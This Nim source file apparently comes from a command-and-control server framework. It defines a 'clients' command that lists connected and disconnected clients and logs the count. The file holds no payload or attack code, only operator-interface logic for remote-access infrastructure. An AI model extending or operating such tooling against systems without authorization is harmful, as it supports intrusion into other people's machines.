import terminal, asyncdispatch, tables

import ../../types
import ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.clients:
    if client.connected:
      stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
    else:
      stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
  infoLog $len(server.clients) & " clients currently connected"

let cmd*: Command = Command(
  execProc: execProc,
  name: "clients",
  aliases: @["c"],
  argsLength: 1,
  usage: @["clients"],
  description: "View clients that were connected and are currently connected",
  category: CCClientInteraction
)